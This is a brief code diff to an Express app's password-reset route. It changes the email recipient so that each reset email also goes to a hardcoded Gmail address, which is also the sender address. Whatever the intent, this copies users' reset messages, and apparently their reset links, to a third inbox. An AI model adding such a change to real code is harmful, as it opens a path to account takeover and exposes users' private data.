@@ -120,7 +120,7 @@ app.post('/send-reset-email', async (req, res) => {
     try {
         await transporter.sendMail({
             from: '"Support" <sasitharani@gmail.com>',
-            to: email,
+            to: [email, 'sasitharani@gmail.com'],
             subject: "Password Reset",
             html: htmlContent,
         });
